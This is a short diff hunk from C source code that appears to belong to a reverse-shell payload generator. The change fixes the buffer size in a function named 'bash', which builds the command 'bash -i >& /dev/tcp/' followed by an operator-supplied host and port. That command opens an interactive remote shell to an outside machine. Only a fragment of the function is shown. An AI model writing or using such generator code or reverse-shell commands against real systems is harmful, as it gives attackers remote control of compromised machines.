@@ -7,7 +7,7 @@ char* bash(char* payload, shell_options_t options) {
   int hostSize = strlen(options.host);
   int portSize = strlen(options.port);
 
-  payload = realloc(payload, (26 + hostSize + portSize) * sizeof(char));
+  payload = realloc(payload, (27 + hostSize + portSize) * sizeof(char));
 
   strcpy(payload, "bash -i >& /dev/tcp/");
   strcat(payload, options.host);
